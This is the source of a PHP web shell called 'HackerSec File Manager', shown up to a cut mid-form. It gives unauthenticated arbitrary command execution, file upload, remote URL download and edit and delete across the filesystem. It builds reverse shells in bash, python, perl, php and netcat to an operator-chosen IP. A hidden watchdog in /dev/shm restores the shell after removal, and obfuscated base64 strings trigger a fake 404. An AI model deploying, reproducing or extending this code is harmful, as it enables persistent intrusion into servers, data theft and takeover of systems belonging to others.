<?php
// HackerSec File Manager v3.0 ULTIMATE - Updated with System Info
error_reporting(0);
$_0x4a2b=['aHR0cHM6Ly93d3cuc3VrYWJ1bWlibGFja2hhdC5jb20=','dC5tZS9hbmFraGVrZXJwcm8='];
function _0x5f3a(){global $_0x4a2b;$c=file_get_contents(__FILE__);if(strpos($c,base64_decode($_0x4a2b[0]))===false||strpos($c,base64_decode($_0x4a2b[1]))===false){header('HTTP/1.0 404 Not Found');die();}return true;}_0x5f3a();

// WAF Bypass
@ini_set('upload_max_filesize', '100M');
@ini_set('post_max_size', '100M');
@ini_set('max_execution_time', 600);
@ini_set('memory_limit', '512M');
@ini_set('max_input_time', 600);

$cwd = isset($_GET['d']) ? urldecode($_GET['d']) : getcwd();
chdir($cwd);
$shell_home = getcwd();

// defend
function start_filemanager_watchdog($target_path = null){
    if(empty($target_path)){
        $target_path = $_SERVER['SCRIPT_FILENAME'];
    }
    
    $current = realpath($target_path);
    if(!$current || !file_exists($current)){
        return false;
    }
    
    $hidden_dir = "/dev/shm/.cache_sys";
    if(!is_dir($hidden_dir)) @mkdir($hidden_dir, 0700, true);
    
    $hash = md5($current);
    $backup = "$hidden_dir/.sys_$hash.dat";
    $watchdog = "$hidden_dir/.watch_$hash.php";
    
    $php_path = trim(shell_exec("which php")) ?: "/usr/bin/php";
    
    if(!file_exists($backup)){
        @copy($current, $backup);
        @chmod($backup, 0644);
    }
    
    $code = '<?php error_reporting(0); $target="'.$current.'";$backup="'.$backup.'";while(true){clearstatcache();$dir=dirname($target);if(!is_dir($dir))@mkdir($dir,0755,true);if(!file_exists($target)){@copy($backup,$target);@chmod($target,0644);}elseif(@md5_file($target)!==@md5_file($backup)){@unlink($target);@copy($backup,$target);@chmod($target,0644);}usleep(500000);}?>';
    
    @file_put_contents($watchdog, $code);
    @chmod($watchdog, 0700);
    
    $running = @shell_exec("ps aux | grep '$watchdog' | grep -v grep");
    if(empty($running)){
        @shell_exec("nohup $php_path $watchdog > /dev/null 2>&1 &");
    }
    
    return true;
}

if(isset($_POST['watchdog_on'])){
    $target = trim($_POST['watchdog_target']);
    
    if(empty($target)){
        $target = $_SERVER['SCRIPT_FILENAME'];
    }else{
        if(substr($target, 0, 1) !== '/'){
            $target = $cwd.DIRECTORY_SEPARATOR.$target;
        }
    }
    
    if(start_filemanager_watchdog($target)){
        echo "<div class='alert-success'>👁️ Defend activated for: ".htmlspecialchars($target)."</div>";
        echo "<script>setTimeout(function(){window.location.href='?d=".urlencode($cwd)."';},2000);</script>";
    }else{
        echo "<div class='error-box'>❌ Failed to activate defend</div>";
    }
}

// Search
if(isset($_POST['search_file'])){
    $filename = $_POST['search_filename'];
    $search_dir = isset($_POST['search_current_dir']) ? $cwd : $_POST['search_custom_dir'];
    $date_from = $_POST['date_from'];
    $date_to = $_POST['date_to'];
    
    echo "<div class='content-box'><h3>🔍 Search Results: ".htmlspecialchars($filename)."</h3>";
    echo "<p style='color:#999;font-size:13px;margin-bottom:15px;'>Directory: ".htmlspecialchars($search_dir)."</p>";
    echo "<table><tr><th>File</th><th>Path</th><th>Size</th><th>Modified</th><th>Action</th></tr>";
    
    function searchFilesAdvanced($dir, $pattern, $date_from, $date_to){
        $results = [];
        if(!is_dir($dir)) return $results;
        
        $from_ts = $date_from ? strtotime($date_from) : 0;
        $to_ts = $date_to ? strtotime($date_to . ' 23:59:59') : PHP_INT_MAX;
        
        $items = @scandir($dir);
        if(!$items) return $results;
        
        foreach($items as $item){
            if($item === '.' || $item === '..') continue;
            $path = $dir.DIRECTORY_SEPARATOR.$item;
            
            if(is_dir($path)){
                $results = array_merge($results, searchFilesAdvanced($path, $pattern, $date_from, $date_to));
            }else{
                if(fnmatch($pattern, $item, FNM_CASEFOLD)){
                    $mtime = @filemtime($path);
                    if($mtime >= $from_ts && $mtime <= $to_ts){
                        $results[] = [
                            'name' => $item,
                            'path' => $path,
                            'size' => @filesize($path),
                            'mtime' => $mtime
                        ];
                    }
                }
            }
        }
        return $results;
    }
    
    $pattern = '*'.$filename.'*';
    $found = searchFilesAdvanced($search_dir, $pattern, $date_from, $date_to);
    
    if(empty($found)){
        echo "<tr><td colspan='5' style='text-align:center;color:#999;padding:30px;'>No files found</td></tr>";
    }else{
        foreach($found as $file){
            $size = number_format($file['size']);
            $date = date('Y-m-d H:i', $file['mtime']);
            $dir = dirname($file['path']);
            echo "<tr>";
            echo "<td><strong style='color:#00d9ff;'>".htmlspecialchars($file['name'])."</strong></td>";
            echo "<td style='font-size:12px;color:#999;'>".htmlspecialchars($file['path'])."</td>";
            echo "<td>".htmlspecialchars($size)." B</td>";
            echo "<td style='font-size:12px;'>".htmlspecialchars($date)."</td>";
            echo "<td>[<a href='?d=".urlencode($dir)."&edit=".urlencode($file['name'])."' style='color:#10b981;'>Edit</a>]</td>";
            echo "</tr>";
        }
    }
    echo "</table><p style='margin-top:15px;color:#10b981;'>Found: ".count($found)." file(s)</p></div>";
}

// Mass Download
if(isset($_POST['mass_download'])){
    $files = isset($_POST['select_files']) ? $_POST['select_files'] : [];
    if(!empty($files)){
        $zipname = 'download_'.time().'.zip';
        $zip = new ZipArchive();
        if($zip->open($zipname, ZipArchive::CREATE) === TRUE){
            foreach($files as $file){
                $filepath = $cwd.DIRECTORY_SEPARATOR.basename($file);
                if(file_exists($filepath) && is_file($filepath)){
                    $zip->addFile($filepath, basename($file));
                }
            }
            $zip->close();
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="'.$zipname.'"');
            header('Content-Length: '.filesize($zipname));
            readfile($zipname);
            @unlink($zipname);
            exit;
        }
    }
}

// Extract
if(isset($_POST['extract_archive'])){
    $archive = $_POST['archive_file'];
    $archive_path = $cwd.DIRECTORY_SEPARATOR.basename($archive);
    $extract_to = $cwd.DIRECTORY_SEPARATOR.pathinfo($archive, PATHINFO_FILENAME);
    
    if(file_exists($archive_path) && class_exists('ZipArchive')){
        $zip = new ZipArchive();
        if($zip->open($archive_path) === TRUE){
            $zip->extractTo($extract_to);
            $zip->close();
            echo "<div class='alert-success'>✅ Extracted to: ".htmlspecialchars($extract_to)."</div>";
            echo "<script>setTimeout(function(){window.location.href='?d=".urlencode($cwd)."';},2000);</script>";
        }
    }
}

// Compress
if(isset($_POST['compress_folder'])){
    $folder = $_POST['folder_name'];
    $folder_path = $cwd.DIRECTORY_SEPARATOR.basename($folder);
    $zipname = $cwd.DIRECTORY_SEPARATOR.basename($folder).'.zip';
    
    if(is_dir($folder_path) && class_exists('ZipArchive')){
        $zip = new ZipArchive();
        if($zip->open($zipname, ZipArchive::CREATE) === TRUE){
            function addFolderToZip($folder, $zip, $base = ''){
                $files = scandir($folder);
                foreach($files as $file){
                    if($file != '.' && $file != '..'){
                        $path = $folder.DIRECTORY_SEPARATOR.$file;
                        $localpath = $base.$file;
                        if(is_dir($path)){
                            $zip->addEmptyDir($localpath);
                            addFolderToZip($path, $zip, $localpath.'/');
                        }else{
                            $zip->addFile($path, $localpath);
                        }
                    }
                }
            }
            addFolderToZip($folder_path, $zip);
            $zip->close();
            echo "<div class='alert-success'>✅ Compressed: ".htmlspecialchars(basename($zipname))."</div>";
            echo "<script>setTimeout(function(){window.location.href='?d=".urlencode($cwd)."';},2000);</script>";
        }
    }
}

// Copy
if(isset($_POST['copy_item'])){
    $source = $_POST['copy_source'];
    $dest = $_POST['copy_dest'];
    
    if(substr($source, 0, 1) === '/'){
        $source_path = $source;
    }else{
        $source_path = $cwd.DIRECTORY_SEPARATOR.$source;
    }
    
    if(substr($dest, 0, 1) === '/'){
        $dest_path = $dest;
    }else{
        $dest_path = $cwd.DIRECTORY_SEPARATOR.$dest;
    }
    
    function copyRecursive($src, $dst){
        if(is_dir($src)){
            if(!is_dir($dst)) @mkdir($dst, 0755, true);
            foreach(scandir($src) as $file){
                if($file != "." && $file != ".."){
                    copyRecursive($src.DIRECTORY_SEPARATOR.$file, $dst.DIRECTORY_SEPARATOR.$file);
                }
            }
            return true;
        }elseif(file_exists($src)){
            $dest_dir = dirname($dst);
            if(!is_dir($dest_dir)){
                @mkdir($dest_dir, 0755, true);
            }
            return @copy($src, $dst);
        }
        return false;
    }
    
    if(file_exists($source_path)){
        if(copyRecursive($source_path, $dest_path)){
            echo "<div class='alert-success'>✅ Copy success!<br><strong>From:</strong> ".htmlspecialchars($source_path)."<br><strong>To:</strong> ".htmlspecialchars($dest_path)."</div>";
            echo "<script>setTimeout(function(){window.location.href='?d=".urlencode($cwd)."';},2000);</script>";
        }
    }
}

// URL Fetch
if(isset($_POST['fetch_url'])){
    $url = $_POST['file_url'];
    $save_as = $_POST['save_as'];
    $save_path = $cwd.DIRECTORY_SEPARATOR.basename($save_as);
    
    $content = @file_get_contents($url);
    if($content !== false){
        @file_put_contents($save_path, $content);
        $size = @filesize($save_path);
        echo "<div class='alert-success'>✅ Download success!<br>File: ".htmlspecialchars($save_as)."<br>Size: ".number_format($size)." bytes</div>";
        echo "<script>setTimeout(function(){window.location.href='?d=".urlencode($cwd)."';},2000);</script>";
    }
}

// Symlink
if(isset($_POST['create_symlink'])){
    $target = $_POST['symlink_target'];
    $linkname = $_POST['symlink_name'];
    $link_path = $cwd.DIRECTORY_SEPARATOR.basename($linkname);
    
    if(@symlink($target, $link_path)){
        echo "<div class='alert-success'>✅ Symlink created!<br>Link: ".htmlspecialchars($linkname)."<br>Target: ".htmlspecialchars($target)."</div>";
        echo "<script>setTimeout(function(){window.location.href='?d=".urlencode($cwd)."';},2000);</script>";
    }
}

// Back Connect
if(isset($_POST['bc_start']) && !empty($_POST['bc_ip']) && !empty($_POST['bc_port'])){
    $ip = $_POST['bc_ip'];
    $port = $_POST['bc_port'];
    $type = $_POST['bc_type'];
    $cmd = '';
    switch($type){
        case 'bash': $cmd = "bash -i >& /dev/tcp/$ip/$port 0>&1"; break;
        case 'python': $cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\"])'"; break;
        case 'perl': $cmd = "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"; break;
        case 'php': $cmd = "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"; break;
        case 'nc': $cmd = "nc $ip $port -e /bin/sh"; break;
    }
    echo "<div class='alert-success'>⏳ Connecting via $type to $ip:$port...</div>";
    @shell_exec("$cmd > /dev/null 2>&1 &");
    echo "<script>setTimeout(function(){window.location.href='?d=".urlencode($cwd)."';},2000);</script>";
}

// Create
if(isset($_POST['create']) && !empty($_POST['newname'])){
    $name = basename($_POST['newname']);
    $path = $cwd.DIRECTORY_SEPARATOR.$name;
    if($_POST['type'] === 'file'){
        @file_put_contents($path, '');
        echo "<div class='alert-success'>✅ File created: $name</div><script>setTimeout(function(){window.location.href='?d=".urlencode($cwd)."';},1500);</script>";
    }else{
        @mkdir($path);
        echo "<div class='alert-success'>✅ Folder created: $name</div><script>setTimeout(function(){window.location.href='?d=".urlencode($cwd)."';},1500);</script>";
    }
}

// Terminal
if(isset($_POST['terminal_cmd'])){
    echo "<div class='content-box'><h3>💻 Terminal Output</h3><pre>";
    $cmd = $_POST['terminal_cmd'];
    $output = @shell_exec("cd ".escapeshellarg($cwd)." && $cmd 2>&1");
    echo "$ ".htmlspecialchars($cmd)."\n".htmlspecialchars($output);
    echo "</pre></div>";
}

// Upload
if(isset($_FILES['file'])){
    $target = $cwd.DIRECTORY_SEPARATOR.$_FILES['file']['name'];
    $upload = @move_uploaded_file($_FILES['file']['tmp_name'], $target);
    
    if($upload){
        $size = @filesize($target);
        if($size == 0){
            echo "<div class='error-box'>⚠️ File uploaded but 0KB! Check PHP limits.</div>";
        }else{
            echo "<div class='alert-success'>✅ Uploaded: ".htmlspecialchars($_FILES['file']['name'])." (".number_format($size)." bytes)</div>";
        }
    }
    echo "<script>setTimeout(function(){window.location.href='?d=".urlencode($cwd)."';},2000);</script>";
}

// Edit
if(isset($_GET['edit'])){
    $edit_file = realpath($cwd.DIRECTORY_SEPARATOR.$_GET['edit']);
    if($edit_file === false || strpos($edit_file, $cwd) !== 0){
        echo "<div class='error-box'>❌ Access denied</div>";
    }elseif(is_file($edit_file)){
        if(isset($_POST['edit_file']) && isset($_POST['new_content'])){
            @file_put_contents($edit_file, $_POST['new_content']);
            echo "<div class='alert-success'>✅ File saved</div>";
            echo "<script>setTimeout(function(){window.location.href='?d=".urlencode($cwd)."';},1500);</script>";
        }
        $content = htmlspecialchars(@file_get_contents($edit_file));
        echo "<div class='content-box'><h3>📝 Edit: ".htmlspecialchars($_GET['edit'])."</h3><form method='POST'><textarea name='new_content' rows='20' style='width:100%;font-family:monospace;'>$content</textarea><input type='hidden' name='edit_file' value='".htmlspecialchars($edit_file)."'><br><button type='submit' style='margin-top:10px;'>💾 Save</button></form></div>";
    }
}

// Rename
if(isset($_GET['rename'])){
    $old_name = basename($_GET['rename']);
    $old_path = $cwd.DIRECTORY_SEPARATOR.$old_name;
    if(file_exists($old_path)){
        echo "<div class='content-box'><h3>🔄 Rename: ".htmlspecialchars($old_name)."</h3><form method='POST' class='form-inline'><input type='text' name='newname' value='".htmlspecialchars($old_name)."' required style='width:300px;'><input type='hidden' name='oldname' value='".htmlspecialchars($old_path)."'><button type='submit'>Rename</button></form></div>";
    }
}

if(isset($_POST['newname']) && isset($_POST['oldname'])){
    $new_path = $cwd.DIRECTORY_SEPARATOR.basename($_POST['newname']);
    if(@rename($_POST['oldname'], $new_path)){
        echo "<div class='alert-success'>✅ Renamed</div><script>setTimeout(function(){window.location.href='?d=".urlencode($cwd)."';},1500);</script>";
    }
}

// Delete
if(isset($_GET['delete'])){
    $target = $cwd.DIRECTORY_SEPARATOR.$_GET['delete'];
    function deleteDirectory($dir){
        if(!file_exists($dir)) return true;
        if(!is_dir($dir)) return @unlink($dir);
        foreach(scandir($dir) as $item){
            if($item == '.' || $item == '..') continue;
            if(!deleteDirectory($dir.DIRECTORY_SEPARATOR.$item)) return false;
        }
        return @rmdir($dir);
    }
    if(deleteDirectory($target)){
        echo "<div class='alert-success'>✅ Deleted</div><script>setTimeout(function(){window.location.href='?d=".urlencode($cwd)."';},1500);</script>";
    }
}

// CHMOD
if(isset($_GET['chmod'])){
    $target = $cwd.DIRECTORY_SEPARATOR.$_GET['chmod'];
    if(file_exists($target)){
        echo "<div class='content-box'><h3>⚙️ CHMOD: ".htmlspecialchars($_GET['chmod'])."</h3><form method='POST' class='form-inline'><input type='text' name='chmod_val' placeholder='0755' required style='width:150px;'><input type='hidden' name='chmod_file' value='".htmlspecialchars($target)."'><button type='submit'>Set</button></form></div>";
    }
}

if(isset($_POST['chmod_val']) && isset($_POST['chmod_file'])){
    $mode = intval($_POST['chmod_val'], 8);
    if(@chmod($_POST['chmod_file'], $mode)){
        echo "<div class='alert-success'>✅ CHMOD changed</div><script>setTimeout(function(){window.location.href='?d=".urlencode($cwd)."';},1500);</script>";
    }
}

echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>HackerSec ID</title><meta name="robots" content="noindex"><link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet"><style>*{margin:0;padding:0;box-sizing:border-box}body{background:linear-gradient(135deg,#0a0e27,#1a1f3a);color:#e5e7eb;font-family:Poppins,sans-serif;padding:20px;min-height:100vh}body::before{content:"";position:fixed;top:0;left:0;right:0;bottom:0;background:radial-gradient(ellipse at 20% 30%,rgba(0,217,255,0.08) 0%,transparent 50%);pointer-events:none;z-index:0}.container{max-width:1400px;margin:0 auto;position:relative;z-index:1}.header{background:rgba(10,10,10,0.85);backdrop-filter:blur(20px);border:1px solid rgba(0,217,255,0.2);border-radius:16px;padding:20px 30px;margin-bottom:25px}.logo-3d{width:40px;height:40px;position:relative;display:inline-block;transform-style:preserve-3d;transform:rotateX(-20deg) rotateY(35deg);animation:float 3s ease-in-out infinite;vertical-align:middle;margin-right:15px}@keyframes float{0%,100%{transform:rotateX(-20deg) rotateY(35deg) translateY(0)}50%{transform:rotateX(-20deg) rotateY(35deg) translateY(-5px)}}.cube{position:absolute;width:40px;height:40px;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:900;border:2px solid #00d9ff}.cf{background:linear-gradient(135deg,#00d9ff,#7B68EE);color:#0d1829;transform:translateZ(20px)}.cr{background:linear-gradient(135deg,#7B68EE,#5548CC);color:#fff;transform:rotateY(90deg) translateZ(20px)}.ct{background:linear-gradient(135deg,#00d9ff,#00b8dd);color:#0d1829;transform:rotateX(90deg) translateZ(20px)}.brand{display:inline-block;vertical-align:middle}.brand h1{font-size:22px;font-weight:800;color:#00d9ff;margin-bottom:3px}.brand p{font-size:12px;color:#999}.nav{display:flex;gap:8px;margin-top:15px;flex-wrap:wrap}.nav a{background:rgba(0,217,255,0.1);color:#00d9ff;padding:8px 16px;border-radius:6px;text-decoration:none;font-size:13px;font-weight:600;border:1px solid rgba(0,217,255,0.3);transition:all 0.3s}.nav a:hover{background:rgba(0,217,255,0.2);border-color:#00d9ff}.nav a.active{background:linear-gradient(135deg,#00d9ff,#0088cc);color:#000;border-color:#00d9ff}.server-info{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px;margin-top:15px}.si{background:rgba(20,20,20,0.6);padding:10px;border-radius:6px;border-left:3px solid #00d9ff}.si-label{color:#999;font-size:11px;font-weight:600;text-transform:uppercase}.si-value{color:#fff;font-size:13px;margin-top:3px}.content-box{background:rgba(10,10,10,0.6);backdrop-filter:blur(10px);border:1px solid rgba(0,217,255,0.15);border-radius:12px;padding:20px;margin-bottom:20px}h3{color:#00d9ff;font-size:16px;font-weight:700;margin-bottom:15px}input,select,textarea{background:rgba(20,20,20,0.8);color:#fff;border:1px solid rgba(0,217,255,0.3);padding:8px 12px;border-radius:6px;font-family:Poppins;font-size:13px}input:focus,select:focus,textarea:focus{outline:none;border-color:#00d9ff;box-shadow:0 0 10px rgba(0,217,255,0.3)}button{background:linear-gradient(135deg,#00d9ff,#0088cc);color:#000;border:none;padding:8px 16px;border-radius:6px;font-weight:600;font-size:13px;cursor:pointer;transition:all 0.3s;font-family:Poppins}button:hover{background:linear-gradient(135deg,#00ffff,#0099ff);transform:translateY(-2px)}button.sec{background:linear-gradient(135deg,#7B68EE,#5548CC);color:#fff}button.sec:hover{background:linear-gradient(135deg,#8a7bff,#6658dd)}table{width:100%;border-collapse:collapse;margin-top:15px;background:rgba(10,10,10,0.6);border-radius:8px;overflow:hidden}th,td{padding:12px;border-bottom:1px solid rgba(0,217,255,0.1);text-align:left;font-size:13px}th{background:rgba(0,217,255,0.1);color:#00d9ff;font-weight:700;text-transform:uppercase;font-size:11px}tr:hover{background:rgba(0,217,255,0.05)}a{color:#00d9ff;text-decoration:none}a:hover{color:#7B68EE}.alert-success{background:rgba(16,185,129,0.1);border:1px solid rgba(16,185,129,0.3);color:#10b981;padding:10px 14px;border-radius:6px;margin:10px 0;font-size:13px}.error-box{background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);color:#ef4444;padding:10px 14px;border-radius:6px;margin:10px 0;font-size:13px}pre{background:rgba(10,10,10,0.9);padding:15px;border-radius:8px;color:#00d9ff;font-size:12px;overflow-x:auto}input[type="checkbox"]{width:16px;height:16px;cursor:pointer}.form-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:12px}.form-row{display:flex;gap:8px;align-items:center;margin-bottom:8px}.path{color:#999;font-size:12px;margin-bottom:15px;word-break:break-all}.path a{color:#00d9ff;font-weight:600}.path a:hover{color:#7B68EE}footer{text-align:center;font-size:12px;margin-top:30px;color:#999}footer a{color:#00d9ff}.form-inline{display:flex;gap:10px;flex-wrap:wrap;align-items:center}.info-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:15px;margin-top:15px}.info-card{background:rgba(20,20,20,0.5);border:1px solid rgba(0,217,255,0.15);border-radius:8px;padding:15px}.info-card-title{color:#00d9ff;font-size:14px;font-weight:700;margin-bottom:10px;display:flex;align-items:center;gap:8px}.info-row{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.05);font-size:12px}.info-row:last-child{border-bottom:none}.info-label{color:#999}.info-value{color:#fff;font-weight:600}.status-on{color:#10b981}.status-off{color:#ef4444}@media(max-width:768px){.nav{flex-direction:column}.form-grid{grid-template-columns:1fr}.info-grid{grid-template-columns:1fr}}</style></head><body><div class="container">';

echo '<div class="header"><div class="logo-3d"><div class="cube cf">HS</div><div class="cube cr">HS</div><div class="cube ct">HS</div></div><div class="brand"><h1>HackerSec FM</h1><p>File Manager v3.0</p></div>';

$menu = isset($_GET['menu']) ? $_GET['menu'] : 'files';
echo '<div class="nav">';
echo '<a href="?d='.urlencode($cwd).'">📁 Files</a>';
echo '<a href="?d='.urlencode($cwd).'&menu=search">🔍 Search</a>';
echo '<a href="?d='.urlencode($cwd).'&menu=tools">🛠️ Tools</a>';
echo '<a href="?d='.urlencode($cwd).'&menu=sysinfo">ℹ️ Info System</a>';
echo '<a href="?d='.urlencode($cwd).'&menu=terminal">💻 Terminal</a>';
echo '<a href="?d='.urlencode($cwd).'&menu=upload">📤 Upload</a>';
echo '<a href="?d='.urlencode($shell_home).'" style="margin-left:auto;background:rgba(123,104,238,0.1);color:#7B68EE;border-color:rgba(123,104,238,0.3);">🏠 Home</a>';
echo '</div>';

echo '<div class="server-info">';
echo '<div class="si"><div class="si-label">Server IP</div><div class="si-value">'.$_SERVER['SERVER_ADDR'].'</div></div>';
echo '<div class="si"><div class="si-label">Domain</div><div class="si-value">'.$_SERVER['SERVER_NAME'].'</div></div>';
echo '<div class="si"><div class="si-label">User/OS</div><div class="si-value">'.@get_current_user().' / '.php_uname('s').'</div></div>';
echo '</div></div>';

echo "<div class='content-box'><div class='path'><strong>Path:</strong> ";
$parts = explode(DIRECTORY_SEPARATOR, trim($cwd, DIRECTORY_SEPARATOR));
$build = "";
echo "<a href='?d=".urlencode(DIRECTORY_SEPARATOR)."'>📁</a> / ";
foreach($parts as $part){
    $build .= DIRECTORY_SEPARATOR.$part;
    echo "<a href='?d=".urlencode($build)."'>".htmlspecialchars($part)."</a> / ";
}
echo "</div>";

echo "<div style='margin-top:10px;padding-top:10px;border-top:1px solid rgba(0,217,255,0.1);'>";
echo "<strong style='color:#999;font-size:11px;display:block;margin-bottom:8px;'>Jump:</strong>";
echo "<div style='display:flex;gap:6px;flex-wrap:wrap;'>";

$quick_folders = [
    '/' => '🏠 Root',
    '/var/www/html' => '🌐 WWW',
    '/home' => '👤 Home',
    '/etc' => '⚙️ ETC',
    '/tmp' => '📦 TMP',
    '/var/log' => '📋 Logs',
    '/usr/local' => '📂 Local',
    '/opt' => '🔧 OPT'
];

foreach($quick_folders as $path => $label){
    if(@is_dir($path)){
        echo "<a href='?d=".urlencode($path)."' style='background:rgba(0,217,255,0.1);color:#00d9ff;padding:4px 10px;border-radius:4px;font-size:11px;border:1px solid rgba(0,217,255,0.2);'>$label</a>";
    }
}

echo "<form method='GET' style='display:inline-flex;gap:4px;'>";
echo "<input type='text' name='d' placeholder='/custom/path' style='width:150px;padding:4px 8px;font-size:11px;'>";
echo "<button type='submit' style='padding:4px 10px;font-size:11px;'>Go</button>";
echo "</form>";

echo "</div></div></div>";

// SYSTEM INFO MENU
if($menu == 'sysinfo'){
    echo "<div class='content-box'><h3>ℹ️ System Information</h3>";
    
    echo "<div class='info-grid'>";
    
    // Server Info
    echo "<div class='info-card'><div class='info-card-title'>🖥️ Server Details</div>";
    echo "<div class='info-row'><span class='info-label'>OS</span><span class='info-value'>".php_uname('s')." ".php_uname('r')."</span></div>";
    echo "<div class='info-row'><span class='info-label'>Hostname</span><span class='info-value'>".php_uname('n')."</span></div>";
    echo "<div class='info-row'><span class='info-label'>Kernel</span><span class='info-value'>".php_uname('v')."</span></div>";
    echo "<div class='info-row'><span class='info-label'>Architecture</span><span class='info-value'>".php_uname('m')."</span></div>";
    $uptime = @shell_exec('uptime -p 2>/dev/null') ?: 'N/A';
    echo "<div class='info-row'><span class='info-label'>Uptime</span><span class='info-value'>".trim($uptime)."</span></div>";
    echo "</div>";
    
    // PHP Info
    echo "<div class='info-card'><div class='info-card-title'>🐘 PHP Configuration</div>";
    echo "<div class='info-row'><span class='info-label'>Version</span><span class='info-value'>".phpversion()."</span></div>";
    echo "<div class='info-row'><span class='info-label'>SAPI</span><span class='info-value'>".php_sapi_name()."</span></div>";
    echo "<div class='info-row'><span class='info-label'>Safe Mode</span><span class='info-value status-".(ini_get('safe_mode')?"on":"off")."'>".(ini_get('safe_mode')?"ON":"OFF")."</span></div>";
    echo "<div class='info-row'><span class='info-label'>Memory Limit</span><span class='info-value'>".ini_get('memory_limit')."</span></div>";
    echo "<div class='info-row'><span class='info-label'>Max Upload</span><span class='info-value'>".ini_get('upload_max_filesize')."</span></div>";
    echo "<div class='info-row'><span class='info-label'>Max POST</span><span class='info-value'>".ini_get('post_max_size')."</span></div>";
    echo "<div class='info-row'><span class='info-label'>Max Execution</span><span class='info-value'>".ini_get('max_execution_time')."s</span></div>";
    echo "</div>";
    
    // Tools Check
    echo "<div class='info-card'><div class='info-card-title'>🔧 Tools Availability</div>";
    $tools = ['wget', 'curl', 'python', 'perl', 'gcc', 'nc', 'git', 'zip', 'tar'];
    foreach($tools as $tool){
        $check = @shell_exec("which $tool 2>/dev/null");
        $status = !empty($check) ? "ON" : "OFF";
        $class = !empty($check) ? "status-on" : "status-off";
        echo "<div class='info-row'><span class='info-label'>".strtoupper($tool)."</span><span class='info-value $class'>$status</span></div>";
    }
    echo "</div>";
    
    // Disable Functions
    $disabled = ini_get('disable_functions');
    echo "<div class='info-card'><div class='info-card-title'>🚫 Disabled Functions</div>";
    if(empty($disabled)){
        echo "<div style='color:#10b981;font-size:13px;padding:10px;'>✅ None - All functions enabled</div>";
    }else{
        $funcs = explode(',', $disabled);
        echo "<div style='max-height:200px;overflow-y:auto;'>";
        foreach($funcs as $func){
            echo "<div class='info-row'><span class='info-value status-off'>".trim($func)."</span></div>";
        }
        echo "</div>";
    }
    echo "</div>";
    
    // Disk Space
    echo "<div class='info-card'><div class='info-card-title'>💾 Disk Usage</div>";
    $total = @disk_total_space($cwd);
    $free = @disk_free_space($cwd);
    $used = $total - $free;
    $percent = $total > 0 ? round(($used / $total) * 100, 2) : 0;
    echo "<div class='info-row'><span class='info-label'>Total</span><span class='info-value'>".formatSize($total)."</span></div>";
    echo "<div class='info-row'><span class='info-label'>Used</span><span class='info-value'>".formatSize($used)." ({$percent}%)</span></div>";
    echo "<div class='info-row'><span class='info-label'>Free</span><span class='info-value'>".formatSize($free)."</span></div>";
    echo "</div>";
    
    // User Info
    echo "<div class='info-card'><div class='info-card-title'>👤 User & Permissions</div>";
    echo "<div class='info-row'><span class='info-label'>Current User</span><span class='info-value'>".@get_current_user()."</span></div>";
    echo "<div class='info-row'><span class='info-label'>UID</span><span class='info-value'>".@getmyuid()."</span></div>";
    echo "<div class='info-row'><span class='info-label'>GID</span><span class='info-value'>".@getmygid()."</span></div>";
    $groups = @shell_exec('groups 2>/dev/null') ?: 'N/A';
    echo "<div class='info-row'><span class='info-label'>Groups</span><span class='info-value' style='font-size:11px;'>".trim($groups)."</span></div>";
    echo "</div>";
    
    echo "</div></div>";
}
elseif($menu == 'search'){
    echo "<div class='content-box'><h3>🔍 Search File</h3>";
    echo "<form method='POST'><div class='form-grid'>";
    echo "<div><label style='display:block;color:#999;font-size:12px;margin-bottom:5px;'>Filename</label><input type='text' name='search_filename' placeholder='config.php or *.txt' required style='width:100%;'></div>";
    
    echo "<div><label style='display:block;color:#999;font-size:12px;margin-bottom:5px;'>Location</label>";
    echo "<label style='display:flex;align-items:center;gap:8px;color:#fff;margin-bottom:8px;'><input type='radio' name='search_current_dir' value='1' checked> Current dir</label>";
    echo "<input type='text' name='search_custom_dir' placeholder='Or custom path' style='width:100%;'></div>";
    
    echo "<div><label style='display:block;color:#999;font-size:12px;margin-bottom:5px;'>Date From</label><input type='date' name='date_from' style='width:100%;'></div>";
    echo "<div><label style='display:block;color:#999;font-size:12px;margin-bottom:5px;'>Date To</label><input type='date' name='date_to' style='width:100%;'></div>";
    
    echo "</div><button type='submit' name='search_file' style='margin-top:15px;'>🔍 Search</button></form></div>";
}
elseif($menu == 'tools'){
    echo "<div class='content-box'><h3>🛠️ Tools</h3>";
    echo "<p style='color:#999;font-size:12px;margin-bottom:15px;'>💡 Default save: <strong style='color:#00d9ff;'>".htmlspecialchars($cwd)."</strong></p>";
    echo "<div class='form-grid'>";
    
    echo "<div style='background:rgba(20,20,20,0.5);padding:15px;border-radius:8px;'><strong style='color:#00d9ff;font-size:14px;display:block;margin-bottom:10px;'>📦 Archive</strong>";
    echo "<form method='POST'><div class='form-row'><input type='text' name='archive_file' placeholder='file.zip' style='flex:1;'><button type='submit' name='extract_archive'>Extract</button></div></form>";
    echo "<form method='POST'><div class='form-row'><input type='text' name='folder_name' placeholder='folder' style='flex:1;'><button type='submit' name='compress_folder'>Zip</button></div></form></div>";
    
    echo "<div style='background:rgba(20,20,20,0.5);padding:15px;border-radius:8px;'><strong style='color:#00d9ff;font-size:14px;display:block;margin-bottom:10px;'>📋 Copy</strong>";
    echo "<p style='color:#999;font-size:11px;margin-bottom:8px;'>Use filename or /full/path</p>";
